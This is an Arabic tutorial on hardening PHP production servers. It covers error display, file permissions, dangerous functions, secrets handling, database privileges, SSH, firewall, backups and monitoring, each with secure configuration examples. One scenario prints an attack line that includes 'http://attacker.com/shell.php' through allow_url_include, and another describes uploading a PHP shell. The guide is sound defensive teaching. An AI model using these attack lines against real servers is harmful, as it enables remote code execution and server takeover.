
## ูุน ุฃูุซูุฉ ุนูููุฉ

---

### **1. ููุงุฐุง ููุนุฏ ุณูุก ุงูุชูููู ุฃุฎุทุฑ ูู ุฎุทุฃ ุจุฑูุฌูุ**
- **ุงูุณุจุจ**: ูุฃู ุซุบุฑุงุช ุงูุชูููู ุชุดูู ุงูุฎุงุฏู ุจุงููุงููุ ูููุณุช ูุญุฏูุฏุฉ ุจุชุทุจูู ูุงุญุฏ.
- **ุงูููุงุฑูุฉ**:
  - **ุฎุทุฃ ุจุฑูุฌู**: ูุคุซุฑ ุนูู ุชุทุจูู ูุนูู ููุท.
  - **ุณูุก ุงูุชูููู**: ูุฏ ูุนุฑุถ ุงูุฎุงุฏู ุจุงููุงูู ููุฎุทุฑ.
- **ุงููุซุงู**: ุฎุงุฏู ูุน `display_errors = On` ูุนุฑุถ ูุณุงุฑุงุช ุงููููุงุช ููููุงุฌูููุ ููุง ูุณุงุนุฏูู ูู ูุฌูุงุช ุฃุฎุฑู.

---

### **2. ููุงุฐุง ูุง ูุฌุจ ุนุฑุถ ุฃุฎุทุงุก PHPุ**
- **ุงูุฎุทุฑ**: Information Disclosure ูุนุทู ุงูููุงุฌู ูุนูููุงุช ูููุฉ:
  1. ูุณุงุฑุงุช ุงููููุงุช ุนูู ุงูุฎุงุฏู
  2. ูููู ูุงุนุฏุฉ ุงูุจูุงูุงุช
  3. ุงูุงุณุชุนูุงูุงุช ุงูุชู ุชุณุชุฎุฏููุง
  4. ููููุงุช ุงููุธุงู
- **ุงููุซุงู**: ุฎุทุฃ ูุธูุฑ:
  ```
  Warning: mysqli_connect() in /var/www/html/config.php on line 15
  ```
  ูุนุฑู ุงูููุงุฌู ุฃูู ุชุณุชุฎุฏู MySQLุ ููููุน ููู ุงูุชูููู.

---

### **3. ููู ูุณุงุนุฏ Hardening ูู ุชูููู ุงููุฌููุ**
- **Hardening**: ุนูููุฉ ุชุฃููู ุงููุธุงู ุนู ุทุฑูู ุชูููู ููุงุท ุงููุฌูู.
- **ุงููุจุงุฏุฆ**:
  1. **ุฃูู ุตูุงุญูุงุช**: ูู ูููู ูุญุตู ููุท ุนูู ูุง ูุญุชุงุฌู
  2. **ุฃูู ุฎุฏูุงุช**: ุฅููุงู ุงูุฎุฏูุงุช ุบูุฑ ุงูุถุฑูุฑูุฉ
  3. **ุงูุชุญุฏูุซ ุงูุฏุงุฆู**: ุฅุตูุงุญ ุงูุซุบุฑุงุช ุงููุนุฑููุฉ
- **ุงูุฃุซุฑ**: ุญุชู ูู ุงุฎุชุฑู ุชุทุจููุ ูุง ูุณุชุทูุน ุงูุงูุชูุงู ูุฃุฌุฒุงุก ุฃุฎุฑู.

---

### **4. ููุงุฐุง ูุง ููุนุฏ HTTPS ุฎูุงุฑูุงุ**
- **ุงูุณุจุจ**: ุฃุตุจุญ HTTPS ุฅูุฒุงููุงู ูุฃุณุจุงุจ:
  1. **ุฎุตูุตูุฉ**: ููุน ุงูุชูุตุช ุนูู ุงูุงุชุตุงูุงุช
  2. **ูุตุฏุงููุฉ**: ุชุฃููุฏ ูููุฉ ุงููููุน
  3. **ุณูุงูุฉ**: ููุน ุชุนุฏูู ุงูุจูุงูุงุช ุฃุซูุงุก ุงูููู
  4. **SEO**: ุฌูุฌู ุชุนุทู ุฃููููุฉ ููููุงูุน ุงูุขููุฉ
  5. **ุงููุชุตูุญุงุช**: ุชุธูุฑ ุชุญุฐูุฑุงุช ููููุงูุน ุบูุฑ ุงูุขููุฉ

---

### **5. ูุง ุงูุฎุทุฑ ูู ุตูุงุญูุงุช 777ุ**
- **ุงูุฎุทุฑ**: ุฃู ูุณุชุฎุฏู ุฃู ุนูููุฉ ุนูู ุงูุฎุงุฏู ูููููุง:
  1. ูุฑุงุกุฉ ุงูููู
  2. ุชุนุฏููู
  3. ุชูููุฐู
- **ุงููุซุงู**: ููู `.env` ุจุตูุงุญูุงุช 777 ูุนุฑุถ ุฌููุน ุฃุณุฑุงุฑ ุงูุชุทุจูู.
- **ุงูุญู**: 
  ```
  755 ูููููุงุช ุงูุชูููุฐูุฉ
  644 ูููููุงุช ุงูุนุงุฏูุฉ
  600 ูููููุงุช ุงูุญุณุงุณุฉ (.env)
  ```

---

### **6. ููุงุฐุง ูุฌุจ ุชุนุทูู ุงูุฏูุงู ุงูุฎุทูุฑุฉุ**
- **ุงูุฏูุงู ุงูุฎุทูุฑุฉ**: ุชุณูุญ ุจุชูููุฐ ุฃูุงูุฑ ุงููุธุงู ุฃู ุญูู ููุฏ.
- **ุฃูุซูุฉ**:
  ```php
  exec(), system(), shell_exec(), passthru()
  eval(), assert(), create_function()
  ```
- **ุงูุฎุทุฑ**: ูู ุงุฎุชุฑู ุงูููุงุฌู ุงูุชุทุจููุ ูุณุชุฎุฏู ูุฐู ุงูุฏูุงู ููุชุญูู ุจุงูุฎุงุฏู.

---

### **7. ูุง ุงูุนูุงูุฉ ุจูู Hardening ูDefense in Depthุ**
- **Defense in Depth**: ุทุจูุงุช ูุชุนุฏุฏุฉ ูู ุงูุฏูุงุน.
- **ุงูุชุทุจูู**:
  1. **ุทุจูุฉ ุงูุดุจูุฉ**: ุฌุฏุงุฑ ุญูุงูุฉ (Firewall)
  2. **ุทุจูุฉ ุงููุธุงู**: ุชุญุฏูุซุงุชุ ุตูุงุญูุงุช
  3. **ุทุจูุฉ ุงูุชุทุจูู**: ููุฏ ุขููุ ูุฏุฎูุงุช ูุธููุฉ
  4. **ุทุจูุฉ ุงูุจูุงูุงุช**: ุชุดููุฑุ ูุณุฎ ุงุญุชูุงุทู
- **ูุงุฆุฏุฉ**: ูู ูุดูุช ุทุจูุฉุ ููุงู ุทุจูุงุช ุฃุฎุฑู ุชุญูู.

---

### **8. ููุงุฐุง ูุง ูุถุน ุงูุฃุณุฑุงุฑ ูู ุงูููุฏุ**
- **ุงููุดููุฉ**:
  1. ุชุณุฑุจ ูู Git
  2. ุธููุฑ ูู ุฃุฎุทุงุก
  3. ุตุนูุจุฉ ุงูุชุบููุฑ
- **ุงูุญููู**:
  ```php
  // ุฎุทุฃ: ุฃุณุฑุงุฑ ูู ุงูููุฏ
  define('DB_PASS', 'mysecret123');
  
  // ุตุญูุญ: ุฃุณุฑุงุฑ ูู ุจูุฆุฉ ูููุตูุฉ
  $db_pass = getenv('DB_PASSWORD');
  
  // ุฃูุถู: ููู .env ุฎุงุฑุฌ ุงููุณุงุฑ ุงูุนุงู
  // .env
  DB_PASSWORD=supersecret123
  ```

---

### **9. ููู ูุคุฏู ุฅุนุฏุงุฏ ูุงุญุฏ ุฎุงุทุฆ ูุงุฎุชุฑุงู ูุงููุ**
- **ุงูุณููุงุฑูู**:
  1. `allow_url_include = On` ูู php.ini
  2. ุงูููุงุฌู ูุญูู `<?php include('http://attacker.com/shell.php') ?>`
  3. ูุชู ุชุญููู ูุชูููุฐ Shell ูู ูููุน ุงูููุงุฌู
  4. ุงูุชุญูู ุงููุงูู ุจุงูุฎุงุฏู
- **ุงูุฏุฑุณ**: ุฅุนุฏุงุฏ ูุงุญุฏ ูุงูู ููุงุฑุซุฉ.

---

### **10. ููุงุฐุง ููุนุฏ A02 ูู ุฃูุซุฑ ุซุบุฑุงุช OWASP ุดููุนูุงุ**
- **A02**: Cryptographic Failures (ุฅุฎูุงูุงุช ุงูุชุดููุฑ)
- **ุงูุฃุณุจุงุจ**:
  1. ุณูููุฉ ุงูุชุดุงู ุงูุจูุงูุงุช ุบูุฑ ุงููุดูุฑุฉ
  2. ุงุณุชุฎุฏุงู ุฎูุงุฑุฒููุงุช ุถุนููุฉ (MD5ุ SHA1)
  3. ุฅุฏุงุฑุฉ ุณูุฆุฉ ููููุงุชูุญ
  4. HTTPS ุบูุฑ ูุทุจู ุจุดูู ุตุญูุญ
- **ุงูุงูุชุดุงุฑ**: ููุฌูุฏ ูู 95% ูู ุงูุชุทุจููุงุช ุญุณุจ ุชูุงุฑูุฑ.

---

## ๐งช ุฃุณุฆูุฉ (ูุงุฐุง ููุ)

### **1. ูุงุฐุง ูู ุชูุฑู display_errors ููุนูููุงุ**
- **ุงููุดููุฉ**: ุธููุฑ ูุนูููุงุช ุญุณุงุณุฉ ูููุณุชุฎุฏููู.
- **ุงููุซุงู**:
  ```
  Fatal error: Uncaught PDOException: SQLSTATE[HY000] [1045] 
  Access denied for user 'root'@'localhost' (using password: YES) 
  in /var/www/html/app/Models/Database.php:42
  ```
- **ุงูุญู**:
  ```ini
  display_errors = Off
  log_errors = On
  error_log = /var/log/php_errors.log
  ```

### **2. ูุงุฐุง ูู ุงุณุชุฎุฏูุช root ููุงุนุฏุฉ ุงูุจูุงูุงุชุ**
- **ุงูุฎุทุฑ**: ูู ุงุฎุชุฑู ุงูุชุทุจููุ ููููุงุฌู ุตูุงุญูุงุช root ุนูู ูุงุนุฏุฉ ุงูุจูุงูุงุช.
- **ุงููุชูุฌุฉ**: ุญุฐู ุฌุฏุงููุ ุชุนุฏูู ุจูุงูุงุชุ ุชุตุนูุฏ.
- **ุงูุญู**: ูุณุชุฎุฏู ูุญุฏูุฏ ุงูุตูุงุญูุงุช:
  ```sql
  CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strongpassword';
  GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';
  -- ูุง GRANT ALL ุฃู DROP
  ```

### **3. ูุงุฐุง ูู ูุงูุช uploads ูุงุจูุฉ ููุชูููุฐุ**
- **ุงูุซุบุฑุฉ**: ุฑูุน ููู PHP ูุชูููุฐู.
- **ุงููุฌูู**: ุฑูุน `shell.php` โ ุฒูุงุฑุฉ `/uploads/shell.php`.
- **ุงูุญู**:
  ```apache
  <Directory /var/www/html/uploads>
      php_flag engine off
      RemoveHandler .php .php3 .php4 .php5 .php7
  </Directory>
  ```

### **4. ูุงุฐุง ูู ูู ุชูุญุฏูุซ ุงูููุชุจุงุชุ**
- **ุงููุดููุฉ**: ุซุบุฑุงุช ูุนุฑููุฉ ุบูุฑ ูุตูุญุฉ.
- **ุงููุซุงู**: Log4j 2021 - ุซุบุฑุฉ ูู ููุชุจุฉ ุณุฌูุงุช ุฃุซุฑุช ุนูู ููุงููู ุงูุฃูุธูุฉ.
- **ุงูุญู**: ุงูุชุญุฏูุซ ุงูุชููุงุฆู ูุงููุฑุงุฌุนุฉ ุงูุฏูุฑูุฉ:
  ```bash
  # Composer
  composer update --dry-run
  composer outdated
  
  # NPM
  npm audit
  npm update
  ```

### **5. ูุงุฐุง ูู ูู ุชุณุฌูู ุงูุฃุฎุทุงุกุ**
- **ุงูุฎุทุฑ**: ูุง ุชุนุฑู ุฃู ููุงู ูุดุงูู ุฃู ูุฌูุงุช.
- **ุงููุชูุฌุฉ**: ูุฌูู ูุงุฌุญ ุฏูู ุงูุชุดุงู.
- **ุงูุญู**: ุณุฌูุงุช ููุธูุฉ:
  ```php
  // php.ini
  error_log = /var/log/php/error.log
  
  // ุชุทุจูู ูุฑูุฒู
  function logError($message, $context = []) {
      $log = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " - $message";
      if (!empty($context)) {
          $log .= " - " . json_encode($context);
      }
      error_log($log);
  }
  ```

---

## โ๏ธ ุชูุฑูู ุชุทุจููู (Hardening Checklist)

### **ุชุทุจูู PHP ุนูู ุฎุงุฏู ุฅูุชุงุฌ**

#### **1. ุชุญุฏูุฏ 10 ุฅุนุฏุงุฏุงุช ุบูุฑ ุขููุฉ**

```yaml
1. ููู php.ini:
   - display_errors = On
   - expose_php = On
   - allow_url_fopen = On
   - allow_url_include = On
   - session.cookie_httponly = Off

2. ุฎุงุฏู ุงูููุจ (Apache/Nginx):
   - ServerTokens Full
   - Directory listing enabled
   - TRACE method enabled
   - No HTTPS redirect

3. ูุงุนุฏุฉ ุงูุจูุงูุงุช:
   - MySQL root with weak password
   - Remote connections allowed
   - Default port (3306)

4. ูุธุงู ุงููููุงุช:
   - Web root: /var/www/html
   - Uploads directory executable
   - .env file world-readable

5. ูุธุงู ุงูุชุดุบูู:
   - SSH with password authentication
   - No firewall
   - Outdated packages
   - Services running as root

6. ุงูุชุทุจูู:
   - Debug mode enabled
   - Composer dev dependencies
   - API keys in source code
   - No input validation

7. ุงูุฌูุณุงุช:
   - Session files in /tmp
   - No session regeneration
   - Long session lifetime

8. DNS ูุงูุฅุนุฏุงุฏุงุช:
   - No DNSSEC
   - No SPF/DKIM/DMARC
   - Old SSL/TLS protocols

9. ุงููุณุฎ ุงูุงุญุชูุงุทู:
   - No backups
   - Backups in web root
   - No encryption for backups

10. ุงููุฑุงูุจุฉ:
    - No error logging
    - No intrusion detection
    - No file integrity monitoring
```

#### **2. ุงูุชุฑุงุญ ุจุฏูู ุขูู ููู ุฅุนุฏุงุฏ**

```yaml
1. ููู php.ini ุงูุขูู:
   - display_errors = Off
   - log_errors = On
   - error_log = /var/log/php/error.log
   - expose_php = Off
   - allow_url_fopen = Off
   - allow_url_include = Off
   - session.cookie_httponly = On
   - session.cookie_secure = On
   - session.cookie_samesite = Strict
   - disable_functions = exec,system,shell_exec,passthru

2. ุฎุงุฏู ุงูููุจ ุงูุขูู (Apache):
   - ServerTokens Prod
   - Options -Indexes
   - TraceEnable Off
   - Redirect HTTP to HTTPS
   
   ูุซุงู Apache VirtualHost:
   ```
   <VirtualHost *:80>
       ServerName example.com
       Redirect permanent / https://example.com/
   </VirtualHost>
   
   <VirtualHost *:443>
       ServerName example.com
       SSLEngine on
       SSLCertificateFile /etc/ssl/certs/example.com.crt
       SSLCertificateKeyFile /etc/ssl/private/example.com.key
       
       Header always set X-Content-Type-Options nosniff
       Header always set X-Frame-Options DENY
       Header always set X-XSS-Protection "1; mode=block"
       
       <Directory /var/www/html>
           Options -Indexes
           AllowOverride All
           Require all granted
       </Directory>
   </VirtualHost>
   ```

3. ูุงุนุฏุฉ ุงูุจูุงูุงุช ุงูุขููุฉ:
   - ูุณุชุฎุฏู ูุฎุตุต ููุชุทุจูู:
   ```sql
   CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'complex_password_here';
   GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'app_user'@'localhost';
   FLUSH PRIVILEGES;
   ```
   - ุชุนุทูู ุงูุงุชุตุงูุงุช ุงูุฎุงุฑุฌูุฉ:
   ```ini
   # my.cnf
   [mysqld]
   bind-address = 127.0.0.1
   skip-networking
   ```
   - ุชุบููุฑ ุงููููุฐ ุงูุงูุชุฑุงุถู (ุงุฎุชูุงุฑู):
   ```ini
   port = 3307
   ```

4. ูุธุงู ุงููููุงุช ุงูุขูู:
   - ูููู ุงููุฌูุฏุงุช:
   ```
   /var/www/
   โโโ app/          # ููุฏ ุงูุชุทุจูู
   โโโ public/       # ุงููุณุงุฑ ุงูุนุงู ููุท
   โ   โโโ index.php
   โ   โโโ css/
   โ   โโโ js/
   โโโ uploads/      # ุฎุงุฑุฌ ุงููุณุงุฑ ุงูุนุงู
   โโโ logs/         # ุณุฌูุงุช ุงูุชุทุจูู
   โโโ .env          # ุฎุงุฑุฌ ุงููุณุงุฑ ุงูุนุงู
   ```
   
   - ุตูุงุญูุงุช:
   ```bash
   chown -R www-data:www-data /var/www
   chmod -R 755 /var/www/app
   chmod -R 755 /var/www/public
   chmod -R 755 /var/www/uploads
   chmod 600 /var/www/.env
   chmod 755 /var/www/logs
   ```

5. ูุธุงู ุงูุชุดุบูู ุงูุขูู:
   - ุฅุนุฏุงุฏุงุช SSH:
   ```bash
   # /etc/ssh/sshd_config
   Port 2222
   PermitRootLogin no
   PasswordAuthentication no
   PubkeyAuthentication yes
   MaxAuthTries 3
   ```
   
   - ุฌุฏุงุฑ ุงูุญูุงูุฉ:
   ```bash
   # UFW
   ufw default deny incoming
   ufw default allow outgoing
   ufw allow 2222/tcp  # SSH
   ufw allow 80/tcp    # HTTP
   ufw allow 443/tcp   # HTTPS
   ufw --force enable
   ```
   
   - ุงูุชุญุฏูุซุงุช:
   ```bash
   # ุชุญุฏูุซ ุชููุงุฆู ููุฃูุงู
   apt-get install unattended-upgrades
   dpkg-reconfigure unattended-upgrades
   ```

6. ุงูุชุทุจูู ุงูุขูู:
   - ููู .env:
   ```
   APP_ENV=production
   APP_DEBUG=false
   APP_KEY=base64:random_key_here
   
   DB_HOST=localhost
   DB_DATABASE=app_db
   DB_USERNAME=app_user
   DB_PASSWORD=complex_password_here
   ```
   
   - composer:
   ```bash
   # ุฅุฒุงูุฉ ุญุฒู ุงูุชุทููุฑ
   composer install --no-dev --optimize-autoloader
   
   # ุชุญูู ูู ุงูุซุบุฑุงุช
   composer audit
   ```

7. ุฅุฏุงุฑุฉ ุงูุฌูุณุงุช ุงูุขููุฉ:
   - ุฅุนุฏุงุฏุงุช PHP:
   ```ini
   session.save_handler = redis
   session.save_path = "tcp://127.0.0.1:6379"
   session.gc_maxlifetime = 1440
   session.cookie_lifetime = 0
   ```
   
   - ููุฏ ุงูุชุทุจูู:
   ```php
   session_start([
       'cookie_lifetime' => 0,
       'cookie_secure' => true,
       'cookie_httponly' => true,
       'cookie_samesite' => 'Strict',
       'use_strict_mode' => true
   ]);
   
   // ุชุฌุฏูุฏ Session ID ุฏูุฑูุงู
   if (!isset($_SESSION['created'])) {
       $_SESSION['created'] = time();
   } else if (time() - $_SESSION['created'] > 300) {
       session_regenerate_id(true);
       $_SESSION['created'] = time();
   }
   ```

8. DNS ูุงูุดูุงุฏุงุช ุงูุขููุฉ:
   - HTTPS ูุฌุงูู (Let's Encrypt):
   ```bash
   apt-get install certbot python3-certbot-apache
   certbot --apache -d example.com -d www.example.com
   
   # ุชุฌุฏูุฏ ุชููุงุฆู
   certbot renew --dry-run
   ```
   
   - ุฅุนุฏุงุฏุงุช DNS:
   ```
   TXT record: v=spf1 include:_spf.google.com ~all
   TXT record: v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3...
   TXT record: v=DMARC1; p=reject; rua=mailto:dmarc@example.com
   ```

9. ุงููุณุฎ ุงูุงุญุชูุงุทู ุงูุขูู:
   - script backup:
   ```bash
   #!/bin/bash
   DATE=$(date +%Y%m%d_%H%M%S)
   BACKUP_DIR="/backups"
   DB_NAME="app_db"
   
   # ูุณุฎ ูุงุนุฏุฉ ุงูุจูุงูุงุช
   mysqldump -u root -p"${DB_PASS}" $DB_NAME | gzip > $BACKUP_DIR/db_$DATE.sql.gz
   
   # ูุณุฎ ุงููููุงุช
   tar -czf $BACKUP_DIR/files_$DATE.tar.gz /var/www
   
   # ุชุดููุฑ ุงููุณุฎ
   openssl enc -aes-256-cbc -salt -in $BACKUP_DIR/db_$DATE.sql.gz \
     -out $BACKUP_DIR/db_$DATE.sql.gz.enc -pass pass:"${ENCRYPTION_KEY}"
   
   # ุญุฐู ุงููุณุฎ ุงููุฏููุฉ
   find $BACKUP_DIR -type f -mtime +30 -delete
   
   # ูุฒุงููุฉ ูุน ุชุฎุฒูู ุณุญุงุจู
   rclone copy $BACKUP_DIR remote:backups/
   ```

10. ูุธุงู ูุฑุงูุจุฉ ุขูู:
    - ูุฑุงูุจุฉ ุงูุณุฌูุงุช:
    ```bash
    # Logwatch ููุชูุงุฑูุฑ ุงูููููุฉ
    apt-get install logwatch
    
    # Fail2ban ููุญูุงูุฉ
    apt-get install fail2ban
    cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
    ```
    
    - ุชูููู Fail2ban:
    ```ini
    # /etc/fail2ban/jail.local
    [sshd]
    enabled = true
    port = 2222
    maxretry = 3
    
    [apache-auth]
    enabled = true
    maxretry = 3
    
    [php-url-fopen]
    enabled = true
    filter = php-url-fopen
    action = iptables-multiport[name=PHP, port="http,https"]
    logpath = /var/log/apache2/error.log
    maxretry = 1
    ```

#### **3. ุชุตููู ุงูุฎุทุฑ**

```yaml
ุฎุทุฑ ุนุงูู (ูุฌุจ ุฅุตูุงุญู ููุฑุงู):
1. display_errors = On
   - ุงูุฎุทุฑ: ูุดู ูุนูููุงุช ุญุณุงุณุฉ
   - ุงูุฅุตูุงุญ: ุชุนุทูู + ุชุณุฌูู ุงูุฃุฎุทุงุก
   
2. ุงุณุชุฎุฏุงู root ููุงุนุฏุฉ ุงูุจูุงูุงุช
   - ุงูุฎุทุฑ: ุงุฎุชุฑุงู ูุงูู ููุจูุงูุงุช
   - ุงูุฅุตูุงุญ: ูุณุชุฎุฏู ูุญุฏูุฏ ุงูุตูุงุญูุงุช
   
3. uploads ูุงุจู ููุชูููุฐ
   - ุงูุฎุทุฑ: ุฑูุน ูุชูููุฐ shell
   - ุงูุฅุตูุงุญ: ุชุนุทูู PHP ูู uploads
   
4. No HTTPS
   - ุงูุฎุทุฑ: ุณุฑูุฉ ุจูุงูุงุชุ MITM
   - ุงูุฅุตูุงุญ: Let's Encrypt
   
5. ุงูุฃุณุฑุงุฑ ูู ุงูููุฏ
   - ุงูุฎุทุฑ: ุชุณุฑูุจ ูู Git
   - ุงูุฅุตูุงุญ: ููู .env

ุฎุทุฑ ูุชูุณุท (ูุฌุจ ุฅุตูุงุญู ุฎูุงู ุฃุณุจูุน):
6. Directory listing enabled
   - ุงูุฎุทุฑ: ูุดู ูููู ุงููููุน
   - ุงูุฅุตูุงุญ: Options -Indexes
   
7. Session ูู /tmp
   - ุงูุฎุทุฑ: ุณุฑูุฉ ุฌูุณุงุช
   - ุงูุฅุตูุงุญ: Redis ูุน ูุตุงุฏูุฉ
   
8. No firewall
   - ุงูุฎุทุฑ: ูุฌูุงุช ูุจุงุดุฑุฉ
   - ุงูุฅุตูุงุญ: UFW/iptables
   
9. ุฅุตุฏุงุฑุงุช ูุฏููุฉ
   - ุงูุฎุทุฑ: ุซุบุฑุงุช ูุนุฑููุฉ
   - ุงูุฅุตูุงุญ: ุชุญุฏูุซ ููุชุธู
   
10. No backups
    - ุงูุฎุทุฑ: ููุฏุงู ุงูุจูุงูุงุช
    - ุงูุฅุตูุงุญ: ูุณุฎ ููููุฉ ูุดูุฑุฉ

ุฎุทุฑ ููุฎูุถ (ุชุญุณููุงุช ุฃูููุฉ):
11. ServerTokens Full
    - ุงูุฎุทุฑ: ูุดู ุฅุตุฏุงุฑุงุช
    - ุงูุฅุตูุงุญ: ServerTokens Prod
    
12. No security headers
    - ุงูุฎุทุฑ: ุจุนุถ ูุฌูุงุช ุงูููุจ
    - ุงูุฅุตูุงุญ: CSP, X-Frame-Options
    
13. No rate limiting
    - ุงูุฎุทุฑ: Brute Force
    - ุงูุฅุตูุงุญ: Fail2ban, ุชุทุจูู Rate limit
    
14. No monitoring
    - ุงูุฎุทุฑ: ุนุฏู ุงูุชุดุงู ุงููุฌูุงุช
    - ุงูุฅุตูุงุญ: ุณุฌูุงุช + ุชูุจููุงุช
    
15. No integrity checks
    - ุงูุฎุทุฑ: ุนุฏู ุงูุชุดุงู ุงูุชุบููุฑุงุช
    - ุงูุฅุตูุงุญ: Tripwire/AIDE
```

#### **4. ูุงุฆูุฉ ูุฑุงุฌุนุฉ ุณุฑูุนุฉ (Checklist)**

```bash
#!/bin/bash
# Security Hardening Checklist Verification

echo "=== PHP Security Check ==="
php -i | grep -E "(display_errors|expose_php|allow_url)" | grep -v "Off"
echo ""

echo "=== Web Server Check ==="
curl -I http://localhost/ | grep -i "server\|x-powered"
echo ""

echo "=== Database Check ==="
mysql -u root -e "SELECT user, host FROM mysql.user WHERE user='root' AND host!='localhost'"
echo ""

echo "=== File Permissions Check ==="
find /var/www -type f -perm /o+wx -ls
echo ""

echo "=== Open Ports Check ==="
netstat -tulpn | grep -E ":(80|443|22|3306)"
echo ""

echo "=== Outdated Packages Check ==="
apt list --upgradable 2>/dev/null | grep -v "Listing"
echo ""

echo "=== SSL Check ==="
openssl s_client -connect localhost:443 -servername localhost 2>/dev/null | openssl x509 -noout -dates
echo ""
```

#### **5. ุฎุทุฉ ุงูุชูููุฐ**

```yaml
ุงูููู 1 (ุงูุทูุงุฑุฆ):
- [ ] ุชุนุทูู display_errors
- [ ] ุชูุนูู HTTPS (Let's Encrypt)
- [ ] ุชุบููุฑ ูุณุชุฎุฏู ูุงุนุฏุฉ ุงูุจูุงูุงุช
- [ ] ุชุฃููู ูุฌูุฏ uploads

ุงูุฃุณุจูุน 1 (ุงูุฃุณุงุณูุงุช):
- [ ] ุฅุนุฏุงุฏ ุฌุฏุงุฑ ุงูุญูุงูุฉ
- [ ] ุชุญุฏูุซ ุฌููุน ุงูุญุฒู
- [ ] ุฅุนุฏุงุฏ ุงููุณุฎ ุงูุงุญุชูุงุทู
- [ ] ุชุนุทูู Directory listing

ุงูุฃุณุจูุน 2 (ุงูุชุทุจูู):
- [ ] ููู ุงูุฃุณุฑุงุฑ ูู .env
- [ ] ุฅุนุฏุงุฏ Redis ููุฌูุณุงุช
- [ ] ุชุทุจูู Rate limiting
- [ ] ุฅุถุงูุฉ Security headers

ุงูุฃุณุจูุน 3 (ุงููุฑุงูุจุฉ):
- [ ] ุฅุนุฏุงุฏ ุณุฌูุงุช ูุฑูุฒูุฉ
- [ ] ุชูููู Fail2ban
- [ ] ุฅุนุฏุงุฏ ุชูุจููุงุช
- [ ] ุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู ุงูุฃุณุงุณู

ุงูุดูุฑ 1 (ุงูุชุทููุฑ ุงููุณุชูุฑ):
- [ ] ูุฑุงุฌุนุฉ ุฏูุฑูุฉ ููุณุฌูุงุช
- [ ] ุชุญุฏูุซ ุฃุณุจูุนู
- [ ] ูุณุฎ ุงุญุชูุงุทู ูููู
- [ ] ูุฑุงุฌุนุฉ ุงูุตูุงุญูุงุช
```

---

## โ ุงูุฎูุงุตุฉ

1. **ุงูุชูููู ุฃูู ูู ุงูููุฏ**: ุฅุนุฏุงุฏ ุฎุงุทุฆ ููุฏุฑ ูู ุงูุฌููุฏ.
2. **ุทุจูุงุช ูุชุนุฏุฏุฉ**: Defense in Depth ูู ุงูููุชุงุญ.
3. **ุงููุฑุงูุจุฉ ุงูุฏุงุฆูุฉ**: ุจุฏูู ุณุฌูุงุชุ ุฃูุช ุฃุนูู.
4. **ุงูุชุญุฏูุซ ูุงุฌุจ**: ุซุบุฑุงุช ุงูููู ูุนุฑููุฉ ุบุฏุงู.
5. **ุฃูู ุตูุงุญูุงุช**: ูุงุนุฏุฉ ุฐูุจูุฉ ููู ุดูุก.
6. **ุงูุชุดููุฑ ูู ูู ููุงู**: ุจูุงูุงุชุ ุงุชุตุงูุงุชุ ูุณุฎ ุงุญุชูุงุทู.
7. **ุงููุณุฎ ุงูุงุญุชูุงุทู**: ููุณ ุฎูุงุฑุงูุ ุจู ุถุฑูุฑุฉ.
